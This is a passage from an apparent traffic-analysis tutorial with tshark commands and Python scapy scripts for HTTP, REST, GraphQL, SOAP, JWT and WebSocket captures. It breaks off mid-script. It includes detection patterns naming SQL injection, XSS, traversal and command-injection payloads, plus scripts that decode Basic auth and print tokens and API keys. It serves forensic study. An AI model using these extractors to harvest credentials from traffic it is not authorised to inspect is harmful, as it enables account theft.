### Parameter Fuzzing Detection

**Identify parameter tampering:**

```bash
# Extract URL parameters
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.uri | grep '?' | cut -d'?' -f2 | tr '&' '\n' | sort -u

# Detect SQL injection attempts
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri \
    | grep -iE "(union|select|insert|update|delete|drop|'|--|;)"

# Detect XSS attempts
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri \
    | grep -iE "(<script|javascript:|onerror=|onload=)"

# Detect path traversal
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri \
    | grep -E "(\.\.\/|\.\.\\)"

# Detect command injection
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri \
    | grep -iE "(\||;|`|\$\(|&&)"
```

**Python attack detection script:**

```python
#!/usr/bin/env python3
from scapy.all import *
import re
from urllib.parse import unquote

def detect_attacks(pcap_file):
    pkts = rdpcap(pcap_file)
    
    # Attack patterns
    patterns = {
        'SQLi': [
            r"union\s+select", r"(\+or\+|\sor\s)1=1", r"'--", r"';--",
            r"admin'--", r"1'\s+or\s+'1'\s*=\s*'1"
        ],
        'XSS': [
            r"<script", r"javascript:", r"onerror\s*=", r"onload\s*=",
            r"<img.*src", r"alert\s*\(", r"<iframe"
        ],
        'Path Traversal': [
            r"\.\./", r"\.\.\\", r"%2e%2e%2f", r"%2e%2e/",
            r"\.\.%2f", r"\.\.%5c"
        ],
        'Command Injection': [
            r";\s*cat\s+", r"\|\s*ls\s+", r"`.*`", r"\$\(.*\)",
            r"&&\s*cat", r"\|\|.*cat"
        ],
        'LFI/RFI': [
            r"file://", r"php://", r"expect://", r"data://",
            r"include\s*=", r"page\s*=.*\.\."
        ]
    }
    
    findings = {attack: [] for attack in patterns}
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                if 'GET ' in payload or 'POST ' in payload:
                    # URL decode
                    decoded = unquote(payload)
                    
                    # Check each attack pattern
                    for attack_type, pattern_list in patterns.items():
                        for pattern in pattern_list:
                            if re.search(pattern, decoded, re.I):
                                timestamp = float(pkt.time)
                                src_ip = pkt[IP].src if IP in pkt else 'unknown'
                                
                                # Extract URI
                                uri_match = re.search(r'(GET|POST)\s+([^\s]+)', payload)
                                uri = uri_match.group(2) if uri_match else 'unknown'
                                
                                findings[attack_type].append({
                                    'time': timestamp,
                                    'src': src_ip,
                                    'uri': uri,
                                    'pattern': pattern
                                })
                                break
            except:
                pass
    
    # Report findings
    print("[*] Attack Detection Results:\n")
    for attack_type, results in findings.items():
        if results:
            print(f"[!] {attack_type}: {len(results)} potential attacks detected")
            for result in results[:5]:  # Show first 5
                print(f"    Time: {result['time']}")
                print(f"    Source: {result['src']}")
                print(f"    URI: {result['uri'][:100]}")
                print(f"    Pattern: {result['pattern']}\n")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./detect_attacks.py capture.pcap")
        sys.exit(1)
    
    detect_attacks(sys.argv[1])
```

## API Request/Response Analysis

APIs (Application Programming Interfaces) use structured data formats like JSON and XML for machine-to-machine communication. Modern web applications heavily rely on REST, GraphQL, and SOAP APIs.

### REST API Traffic Analysis

**Identify REST endpoints:**

```bash
# Extract API endpoints
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.method -e http.request.uri | grep -E "/api/|/v[0-9]/"

# Common REST patterns
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.uri | grep -E "/(users|posts|comments|products|items)/[0-9]+"

# Extract JSON requests
tshark -r capture.pcap -Y "http.content_type contains \"json\" && http.request" \
    -T fields -e http.request.uri -e http.file_data

# Extract JSON responses
tshark -r capture.pcap -Y "http.content_type contains \"json\" && http.response" \
    -T fields -e http.response.code -e http.file_data
```

**Map API structure:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import re
import json

def map_api_structure(pcap_file):
    pkts = rdpcap(pcap_file)
    
    api_endpoints = defaultdict(lambda: {
        'methods': set(),
        'request_samples': [],
        'response_samples': [],
        'parameters': set()
    })
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Parse HTTP request
                if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'PATCH ')):
                    lines = payload.split('\r\n')
                    request_line = lines[0]
                    
                    # Extract method and URI
                    parts = request_line.split()
                    if len(parts) >= 2:
                        method = parts[0]
                        uri = parts[1]
                        
                        # Normalize URI (remove IDs, keep structure)
                        normalized_uri = re.sub(r'/\d+', '/{id}', uri)
                        normalized_uri = re.sub(r'\?.*', '', normalized_uri)
                        
                        # Check if API endpoint
                        if '/api/' in normalized_uri or re.search(r'/v\d+/', normalized_uri):
                            api_endpoints[normalized_uri]['methods'].add(method)
                            
                            # Extract parameters
                            if '?' in uri:
                                params = uri.split('?')[1].split('&')
                                for param in params:
                                    if '=' in param:
                                        key = param.split('=')[0]
                                        api_endpoints[normalized_uri]['parameters'].add(key)
                            
                            # Extract request body (JSON)
                            if '\r\n\r\n' in payload:
                                body = payload.split('\r\n\r\n', 1)[1]
                                if body.strip().startswith(('{', '[')):
                                    try:
                                        json_data = json.loads(body)
                                        api_endpoints[normalized_uri]['request_samples'].append(json_data)
                                    except:
                                        pass
                
                # Parse HTTP response
                elif payload.startswith('HTTP/'):
                    if '\r\n\r\n' in payload:
                        headers, body = payload.split('\r\n\r\n', 1)
                        
                        # Check for JSON response
                        if 'application/json' in headers and body.strip().startswith(('{', '[')):
                            try:
                                json_data = json.loads(body)
                                # Store response sample (associate with last request)
                                # [Inference] This assumes response follows request in packet order
                            except:
                                pass
            except:
                pass
    
    # Display API map
    print("[*] API Structure Map:\n")
    for endpoint, data in sorted(api_endpoints.items()):
        print(f"[+] {endpoint}")
        print(f"    Methods: {', '.join(sorted(data['methods']))}")
        if data['parameters']:
            print(f"    Parameters: {', '.join(sorted(data['parameters']))}")
        if data['request_samples']:
            print(f"    Request sample: {json.dumps(data['request_samples'][0], indent=2)[:200]}")
        print()
    
    return api_endpoints

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./map_api.py capture.pcap")
        sys.exit(1)
    
    api_map = map_api_structure(sys.argv[1])
    
    # Save to JSON
    serializable_map = {
        endpoint: {
            'methods': list(data['methods']),
            'parameters': list(data['parameters']),
            'request_samples': data['request_samples'][:3]
        }
        for endpoint, data in api_map.items()
    }
    
    with open('api_map.json', 'w') as f:
        json.dump(serializable_map, f, indent=2)
    
    print("[*] API map saved to api_map.json")
```

### JSON Data Extraction and Analysis

**Extract JSON from traffic:**

```bash
# Extract all JSON payloads
tshark -r capture.pcap -Y "http.content_type contains \"json\"" \
    -T fields -e http.file_data | while read line; do
        echo "$line" | xxd -r -p 2>/dev/null
    done > json_data.txt

# Pretty print JSON
tshark -r capture.pcap -Y "http.content_type contains \"json\"" \
    -T fields -e http.file_data | while read line; do
        echo "$line" | xxd -r -p 2>/dev/null | jq . 2>/dev/null
    done
```

**Python JSON analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *
import json
import re
from collections import defaultdict

def analyze_json_traffic(pcap_file):
    pkts = rdpcap(pcap_file)
    
    json_payloads = []
    sensitive_data = defaultdict(list)
    
    # Patterns for sensitive data
    sensitive_patterns = {
        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
        'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
        'credit_card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
        'ipv4': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
        'jwt': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    }
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Check for JSON content
                if 'application/json' in payload:
                    # Extract JSON body
                    if '\r\n\r\n' in payload:
                        body = payload.split('\r\n\r\n', 1)[1]
                        
                        # Try to parse JSON
                        try:
                            json_obj = json.loads(body)
                            json_payloads.append(json_obj)
                            
                            # Convert to string for pattern matching
                            json_str = json.dumps(json_obj)
                            
                            # Search for sensitive data
                            for data_type, pattern in sensitive_patterns.items():
                                matches = re.findall(pattern, json_str)
                                if matches:
                                    sensitive_data[data_type].extend(matches)
                            
                            # Look for common sensitive keys
                            sensitive_keys = ['password', 'token', 'api_key', 'secret', 
                                            'apikey', 'auth', 'credential', 'private']
                            
                            def find_sensitive_keys(obj, path=''):
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        current_path = f"{path}.{key}" if path else key
                                        
                                        # Check if key contains sensitive terms
                                        if any(term in key.lower() for term in sensitive_keys):
                                            print(f"[!] Sensitive key found: {current_path} = {value}")
                                            sensitive_data['keys'].append({
                                                'path': current_path,
                                                'value': str(value)[:100]
                                            })
                                        
                                        find_sensitive_keys(value, current_path)
                                elif isinstance(obj, list):
                                    for i, item in enumerate(obj):
                                        find_sensitive_keys(item, f"{path}[{i}]")
                            
                            find_sensitive_keys(json_obj)
                            
                        except json.JSONDecodeError:
                            pass
            except:
                pass
    
    # Report findings
    print(f"\n[*] Analyzed {len(json_payloads)} JSON payloads\n")
    
    print("[*] Sensitive Data Found:")
    for data_type, values in sensitive_data.items():
        if values and data_type != 'keys':
            print(f"\n[+] {data_type.upper()}: {len(set(values))} unique values")
            for value in list(set(values))[:5]:
                print(f"    - {value}")
    
    if 'keys' in sensitive_data and sensitive_data['keys']:
        print(f"\n[+] Sensitive Keys: {len(sensitive_data['keys'])} found")
        for item in sensitive_data['keys'][:10]:
            print(f"    - {item['path']}: {item['value']}")
    
    return json_payloads, sensitive_data

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./analyze_json.py capture.pcap")
        sys.exit(1)
    
    payloads, sensitive = analyze_json_traffic(sys.argv[1])
```

### JWT Token Analysis

**Extract and decode JWT tokens:**

```bash
# Find JWT tokens in traffic
tshark -r capture.pcap -Y "http" -T fields -e http.authorization \
    | grep -o 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'

# Extract from cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie \
    | grep -o 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
```

**Python JWT decoder:**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64
import json
import re

def decode_jwt(token):
    """Decode JWT without verification"""
    try:
        # Split token
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        header = parts[0]
        payload = parts[1]
        signature = parts[2]
        
        # Add padding if needed
        header += '=' * (4 - len(header) % 4)
        payload += '=' * (4 - len(payload) % 4)
        
        # Decode
        header_decoded = json.loads(base64.urlsafe_b64decode(header))
        payload_decoded = json.loads(base64.urlsafe_b64decode(payload))
        
        return {
            'header': header_decoded,
            'payload': payload_decoded,
            'signature': signature
        }
    except Exception as e:
        return None

def extract_jwt_tokens(pcap_file):
    pkts = rdpcap(pcap_file)
    
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    tokens = set()
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Find JWT tokens
                matches = re.findall(jwt_pattern, payload)
                tokens.update(matches)
            except:
                pass
    
    print(f"[*] Found {len(tokens)} unique JWT tokens\n")
    
    for i, token in enumerate(tokens, 1):
        print(f"[+] Token {i}:")
        print(f"    Raw: {token[:50]}...")
        
        decoded = decode_jwt(token)
        if decoded:
            print(f"    Header: {json.dumps(decoded['header'], indent=6)}")
            print(f"    Payload: {json.dumps(decoded['payload'], indent=6)}")
            
            # Check for security issues
            if 'exp' in decoded['payload']:
                import time
                exp = decoded['payload']['exp']
                current_time = int(time.time())
                if exp < current_time:
                    print(f"    [!] Token EXPIRED (exp: {exp}, current: {current_time})")
                else:
                    print(f"    [+] Token valid until: {exp}")
            
            if decoded['header'].get('alg') == 'none':
                print(f"    [!] CRITICAL: Algorithm is 'none' - no signature verification!")
            
            if decoded['header'].get('alg') in ['HS256', 'HS384', 'HS512']:
                print(f"    [*] Uses HMAC - vulnerable to brute force if weak secret")
            
            # Check for sensitive data in payload
            sensitive_keys = ['password', 'secret', 'private_key', 'admin', 'role']
            for key in sensitive_keys:
                if key in decoded['payload']:
                    print(f"    [!] Sensitive key '{key}': {decoded['payload'][key]}")
        else:
            print(f"    [!] Failed to decode token")
        
        print()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./jwt_analyzer.py capture.pcap")
        sys.exit(1)
    
    extract_jwt_tokens(sys.argv[1])
```

### GraphQL Traffic Analysis

GraphQL APIs use a single endpoint with complex queries in POST bodies.

**Identify GraphQL traffic:**

```bash
# Find GraphQL endpoints
tshark -r capture.pcap -Y "http.request.method == POST" -T fields \
    -e http.request.uri -e http.file_data | grep -i graphql

# Extract GraphQL queries
tshark -r capture.pcap -Y "http.file_data contains \"query\" || \
    http.file_data contains \"mutation\"" -T fields -e http.file_data
```

**Python GraphQL analyzer:**

```python
#!/usr/bin/env python3
from scapy.all import *
import json
import re

def analyze_graphql(pcap_file):
    pkts = rdpcap(pcap_file)
    
    queries = []
    mutations = []
    schemas = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Check for GraphQL content
                if '\r\n\r\n' in payload and ('query' in payload.lower() or 'mutation' in payload.lower()):
                    body = payload.split('\r\n\r\n', 1)[1]
                    
                    try:
                        data = json.loads(body)
                        
                        # Extract query
                        if 'query' in data:
                            query_text = data['query']
                            
                            # Determine if query or mutation
                            if query_text.strip().startswith('mutation'):
                                mutations.append({
                                    'query': query_text,
                                    'variables': data.get('variables', {})
                                })
                            else:
                                queries.append({
                                    'query': query_text,
                                    'variables': data.get('variables', {})
                                })
                            
                            # Extract field names (schema discovery)
                            fields = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\s*(?:\(|{)', query_text)
                            schemas.extend(fields)
                    
                    except json.JSONDecodeError:
                        # Try to extract query from URL-encoded format
                        if 'query=' in body:
                            from urllib.parse import parse_qs, unquote
                            parsed = parse_qs(body)
                            if 'query' in parsed:
                                query_text = unquote(parsed['query'][0])
                                queries.append({'query': query_text, 'variables': {}})
            except:
                pass
    
    # Report findings
    print(f"[*] GraphQL Analysis Results:\n")
    print(f"[+] Queries found: {len(queries)}")
    print(f"[+] Mutations found: {len(mutations)}")
    print(f"[+] Unique fields: {len(set(schemas))}\n")
    
    if queries:
        print("[*] Sample Queries:")
        for i, q in enumerate(queries[:3], 1):
            print(f"\n[{i}] Query:")
            print(f"{q['query'][:300]}")
            if q['variables']:
                print(f"Variables: {json.dumps(q['variables'], indent=2)[:200]}")
    
    if mutations:
        print("\n[*] Sample Mutations:")
        for i, m in enumerate(mutations[:3], 1):
            print(f"\n[{i}] Mutation:")
            print(f"{m['query'][:300]}")
            if m['variables']:
                print(f"Variables: {json.dumps(m['variables'], indent=2)[:200]}")
    
    if schemas:
        print("\n[*] Discovered Schema Fields:")
        unique_fields = sorted(set(schemas))
        for field in unique_fields[:20]:
            print(f"  - {field}")
    
    return queries, mutations, schemas

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./graphql_analyzer.py capture.pcap")
        sys.exit(1)
    
    analyze_graphql(sys.argv[1])
```

### XML/SOAP API Analysis

**Extract XML data:**

```bash
# Find XML content
tshark -r capture.pcap -Y "http.content_type contains \"xml\"" -T fields \
    -e http.file_data | while read line; do
        echo "$line" | xxd -r -p 2>/dev/null | xmllint --format - 2>/dev/null
    done

# Extract SOAP actions
tshark -r capture.pcap -Y "http" -T fields -e http.soapaction | grep -v '^$'
```

**Python XML/SOAP parser:**

```python
#!/usr/bin/env python3
from scapy.all import *
import xml.etree.ElementTree as ET
import re

def analyze_xml_traffic(pcap_file):
    pkts = rdpcap(pcap_file)
    
    xml_payloads = []
    soap_actions = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Check for XML content
                if 'application/xml' in payload or 'text/xml' in payload or 'soap' in payload.lower():
                    
                    # Extract SOAP Action header
                    soap_match = re.search(r'SOAPAction:\s*"?([^"\r\n]+)"?', payload, re.I)
                    if soap_match:
                        soap_actions.append(soap_match.group(1))
                    
                    # Extract XML body
                    if '\r\n\r\n' in payload:
                        body = payload.split('\r\n\r\n', 1)[1]
                        
                        # Check if it's XML
                        if body.strip().startswith('<'):
                            try:
                                root = ET.fromstring(body)
                                xml_payloads.append({
                                    'root_tag': root.tag,
                                    'namespace': root.tag.split('}')[0].strip('{') if '}' in root.tag else None,
                                    'body': body
                                })
                                
                                # Extract interesting elements
                                print(f"[+] XML Document found:")
                                print(f"    Root: {root.tag}")
                                
                                # Find credentials in XML
                                for elem in root.iter():
                                    if any(term in elem.tag.lower() for term in ['user', 'pass', 'auth', 'token', 'key']):
                                        print(f"    [!] Sensitive element: {elem.tag} = {elem.text}")
                                
                                print()
                            
                            except ET.ParseError:
                                pass
            except:
                pass
    
    print(f"\n[*] XML Analysis Summary:")
    print(f"[+] XML documents found: {len(xml_payloads)}")
    print(f"[+] SOAP actions found: {len(soap_actions)}")
    
    if soap_actions:
        print(f"\n[*] SOAP Actions:")
        for action in set(soap_actions):
            print(f"  - {action}")
    
    return xml_payloads, soap_actions

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./xml_analyzer.py capture.pcap")
        sys.exit(1)
    
    analyze_xml_traffic(sys.argv[1])
```

### API Authentication Analysis

**Identify authentication schemes:**

```bash
# Extract Authorization headers
tshark -r capture.pcap -Y "http.authorization" -T fields \
    -e http.authorization | sort -u

# Find authentication endpoints
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.uri | grep -iE "(login|auth|token|signin)"

# Extract API keys from URLs
tshark -r capture.pcap -Y "http.request" -T fields \
    -e http.request.uri | grep -oE "(api_key|apikey|key|token)=[^&\s]+"

# Extract API keys from headers
tshark -r capture.pcap -Y "http" -T fields -e http.header \
    | grep -iE "x-api-key|api-key|apikey"
```

**Python authentication analyzer:**

```python
#!/usr/bin/env python3
from scapy.all import *
import re
import base64
from collections import defaultdict

def analyze_authentication(pcap_file):
    pkts = rdpcap(pcap_file)
    
    auth_methods = defaultdict(list)
    api_keys = set()
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                if 'GET ' in payload or 'POST ' in payload:
                    lines = payload.split('\r\n')
                    
                    for line in lines:
                        # Basic Authentication
                        if line.startswith('Authorization: Basic '):
                            encoded = line.split('Basic ')[1].strip()
                            try:
                                decoded = base64.b64decode(encoded).decode('utf-8')
                                auth_methods['Basic'].append(decoded)
                                print(f"[+] Basic Auth: {decoded}")
                            except:
                                pass
                        
                        # Bearer Token
                        elif line.startswith('Authorization: Bearer '):
                            token = line.split('Bearer ')[1].strip()
                            auth_methods['Bearer'].append(token)
                            print(f"[+] Bearer Token: {token[:50]}...")
                        
                        # API Key in header
                        elif re.match(r'X-API-Key:|API-Key:|X-Api-Key:', line, re.I):
                            key = line.split(':', 1)[1].strip()
                            api_keys.add(key)
                            auth_methods['API-Key-Header'].append(key)
                            print(f"[+] API Key (Header): {key}")
                        
                        # OAuth
                        elif line.startswith('Authorization: OAuth '):
                            oauth = line.split('OAuth ')[1].strip()
                            auth_methods['OAuth'].append(oauth)
                            print(f"[+] OAuth: {oauth[:50]}...")
                        
                        # Digest Authentication
                        elif line.startswith('Authorization: Digest '):
                            digest = line.split('Digest ')[1].strip()
                            auth_methods['Digest'].append(digest)
                            print(f"[+] Digest Auth: {digest[:50]}...")
                    
                    # API Key in URL
                    if 'GET ' in payload or 'POST ' in payload:
                        uri_match = re.search(r'(GET|POST)\s+([^\s]+)', payload)
                        if uri_match:
                            uri = uri_match.group(2)
                            
                            # Extract API key from query parameters
                            key_match = re.search(r'(api_?key|apikey|key|token)=([^&\s]+)', uri, re.I)
                            if key_match:
                                key = key_match.group(2)
                                api_keys.add(key)
                                auth_methods['API-Key-URL'].append(key)
                                print(f"[+] API Key (URL): {key}")
            except:
                pass
    
    # Summary
    print(f"\n[*] Authentication Summary:")
    for method, values in auth_methods.items():
        print(f"\n[+] {method}: {len(values)} instances")
        unique_values = list(set(values))[:3]
        for val in unique_values:
            print(f"    - {val[:80]}")
    
    return auth_methods, api_keys

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./auth_analyzer.py capture.pcap")
        sys.exit(1)
    
    analyze_authentication(sys.argv[1])
```

## WebSocket Analysis

WebSocket provides full-duplex communication over a single TCP connection, commonly used for real-time applications like chat, gaming, and live updates.

### WebSocket Protocol Basics

WebSocket connections start with an HTTP upgrade request:

```
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Response:

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Identifying WebSocket Traffic

**Wireshark filters:**

```
# WebSocket handshake
http.upgrade contains "websocket"
websocket.connection.upgrade

# WebSocket frames
websocket
websocket.opcode
websocket.payload

# Specific opcodes
websocket.opcode == 1    # Text frame
websocket.opcode == 2    # Binary frame
websocket.opcode == 8    # Connection close
websocket.opcode == 9    # Ping
websocket.opcode == 10   # Pong
```

**Tshark WebSocket extraction:**

```bash
# Find WebSocket handshakes
tshark -r capture.pcap -Y "http.upgrade contains websocket" -T fields \
    -e ip.src -e ip.dst -e http.request.uri -e http.sec_websocket_key

# Extract WebSocket messages
tshark -r capture.pcap -Y "websocket" -T fields \
    -e frame.time -e websocket.opcode -e websocket.payload

# Extract text frames only
tshark -r capture.pcap -Y "websocket.opcode == 1" -T fields \
    -e websocket.payload

# Count frame types
tshark -r capture.pcap -Y "websocket" -T fields \
    -e websocket.opcode | sort | uniq -c
```

### WebSocket Message Extraction

**Python WebSocket analyzer:**

```python
#!/usr/bin/env python3
from scapy.all import *
import struct
import re

def parse_websocket_frame(data):
    """Parse WebSocket frame structure"""
    if len(data) < 2:
        return None
    
    # First byte: FIN, RSV, Opcode
    byte1 = data[0]
    fin = (byte1 >> 7) & 1
    opcode = byte1 & 0x0F
    
    # Second byte: Mask, Payload length
    byte2 = data[1]
    masked = (byte2 >> 7) & 1
    payload_len = byte2 & 0x7F
    
    # Opcodes
    opcodes = {
        0: 'continuation',
        1: 'text',
        2: 'binary',
        8: 'close',
        9: 'ping',
        10: 'pong'
    }
    
    offset = 2
    
    # Extended payload length
    if payload_len == 126:
        if len(data) < offset + 2:
            return None
        payload_len = struct.unpack('>H', data[offset:offset+2])[0]
        offset += 2
    elif payload_len == 127:
        if len(data) < offset + 8:
            return None
        payload_len = struct.unpack('>Q', data[offset:offset+8])[0]
        offset += 8
    
    # Masking key
    masking_key = None
    if masked:
        if len(data) < offset + 4:
            return None
        masking_key = data[offset:offset+4]
        offset += 4
    
    # Payload
    if len(data) < offset + payload_len:
        return None
    
    payload = data[offset:offset+payload_len]
    
    # Unmask if necessary
    if masked and masking_key:
        unmasked = bytearray()
        for i in range(len(payload)):
            unmasked.append(payload[i] ^ masking_key[i % 4])
        payload = bytes(unmasked)
    
    return {
        'fin': fin,
        'opcode': opcode,
        'opcode_name': opcodes.get(opcode, 'unknown'),
        'masked': masked,
        'payload_length': payload_len,
        'payload': payload
    }

def analyze_websocket(pcap_file):
    pkts = rdpcap(pcap_file)
    
    websocket_connections = []
    messages = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load
                
                # Check for WebSocket handshake
                if b'Upgrade: websocket' in payload or b'upgrade: websocket' in payload:
                    src = pkt[IP].src if IP in pkt else 'unknown'
                    dst = pkt[IP].dst if IP in pkt else 'unknown'
                    src_port = pkt[TCP].sport
                    dst_port = pkt[TCP].dport
                    
                    # Extract WebSocket key
                    key_match = re.search(rb'Sec-WebSocket-Key:\s*([^\r\n]+)', payload)
                    key = key_match.group(1).decode() if key_match else None
                    
                    connection = {
                        'src': f"{src}:{src_port}",
                        'dst': f"{dst}:{dst_port}",
                        'key': key
                    }
                    websocket_connections.append(connection)
                    print(f"[+] WebSocket Handshake: {connection['src']} → {connection['dst']}")
                    if key:
                        print(f"    Key: {key}")
                
                # Try to parse as WebSocket frame
                else:
                    frame = parse_websocket_frame(payload)
                    if frame:
                        timestamp = float(pkt.time)
                        src = pkt[IP].src if IP in pkt else 'unknown'
                        
                        messages.append({
                            'time': timestamp,
                            'src': src,
                            'opcode': frame['opcode_name'],
                            'payload': frame['payload']
                        })
                        
                        # Print text messages
                        if frame['opcode'] == 1:  # Text frame
                            try:
                                text = frame['payload'].decode('utf-8')
                                print(f"\n[{timestamp}] Text message from {src}:")
                                print(f"    {text[:200]}")
                            except:
                                pass
                        
                        # Print binary frame info
                        elif frame['opcode'] == 2:
                            print(f"\n[{timestamp}] Binary message from {src}:")
                            print(f"    Length: {len(frame['payload'])} bytes")
                            print(f"    Hex: {frame['payload'][:50].hex()}")
            
            except:
                pass
    
    # Summary
    print(f"\n[*] WebSocket Analysis Summary:")
    print(f"[+] Connections: {len(websocket_connections)}")
    print(f"[+] Messages: {len(messages)}")
    
    # Message type breakdown
    from collections import Counter
    opcode_counts = Counter(msg['opcode'] for msg in messages)
    print(f"\n[*] Message Types:")
    for opcode, count in opcode_counts.items():
        print(f"    {opcode}: {count}")
    
    return websocket_connections, messages

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./websocket_analyzer.py capture.pcap")
        sys.exit(1)
    
    connections, messages = analyze_websocket(sys.argv[1])
    
    # Save messages to file
    with open('websocket_messages.txt', 'w') as f:
        for msg in messages:
            if msg['opcode'] == 'text':
                try:
                    text = msg['payload'].decode('utf-8')
                    f.write(f"[{msg['time']}] {msg['src']}: {text}\n")
                except:
                    pass
    
    print("\n[*] Text messages saved to websocket_messages.txt")
```

### WebSocket Message Decoding

**JSON over WebSocket:**

```python
#!/usr/bin/env python3
from scapy.all import *
import json

def extract_json_messages(pcap_file):
    pkts = rdpcap(pcap_file)
    
    json_messages = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load
            
            # Simple heuristic: look for JSON-like payloads
            # [Inference] This assumes unmasked frames or post-handshake plaintext
            for possible_json in re.findall(rb'\{[^}]+\}', payload):
                try:
                    json_obj = json.loads(possible_json.decode('utf-8'))
                    timestamp = float(pkt.time)
                    src = pkt[IP].src if IP in pkt else 'unknown'
                    
                    json_messages.append({
                        'time': timestamp,
                        'src': src,
                        'data': json_obj
                    })
                    
                    print(f"[+] JSON message from {src}:")
                    print(json.dumps(json_obj, indent=2))
                    print()
                
                except:
                    pass
    
    return json_messages

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: ./websocket_json.py capture.pcap")
        sys.exit(1)
    
    messages = extract_json_messages(sys.argv[1])
    print(f"\n[*] Extracted {len(messages)} JSON messages")
```

### WebSocket Security Analysis

**Detect security issues:**

```python
#!/usr/bin/env python3
from scapy.all import *
import re

def analyze_websocket_security(pcap_file):
    pkts = rdpcap(pcap_file)
    
    issues = []
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            try:
                payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Check handshake security
                if 'Upgrade: websocket' in payload or 'upgrade: websocket' in payload:
                    
                    # Check for unencrypted connection (ws:// vs wss://)
                    if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                        issues.append({
                            'type': 'Unencrypted Connection',
                            'severity': 'HIGH',
                            'description': 'WebSocket connection over plain HTTP (ws://)',
                            'packet': pkt.summary()
                        })
                        print(f"[!] HIGH: Unencrypted WebSocket connection detected")
                    
                    # Check for missing Origin header
                    if 'Origin:' not in payload:
                        issues.append({
                            'type': 'Missing Origin Header',
                            'severity': 'MEDIUM',
                            'description': 'WebSocket handshake without Origin header',
                            'packet': pkt.summary()
                        })
                        print(f"[!] MEDIUM: Missing Origin header in handshake")
                    
                    # Extract and validate Origin
                    origin_match = re.search(r'Origin:\s*([^\r\n]+)', payload, re.I)
                    if origin_match:
                        origin = origin_match.group(1)
                        # Check for localhost/file origins (potential CSRF)
                        if 'localhost' in origin or 'file://' in origin or '127.0.0.1' in origin:
                            issues.append({
                                'type': 'Suspicious Origin',
                                'severity': 'MEDIUM',
                                'description': f'Local origin: {origin}',
                                'packet': pkt.summary()
                            })
                            print(f"[!] MEDIUM: Suspicious origin - {origin}")
                
                # Check for sensitive data in messages
                sensitive_patterns = [
                    (r'password["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', 'Password'),
                    (r'token["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', 'Token'),
                    (r'api[_-]?key["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', 'API Key'),
                    (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email'),
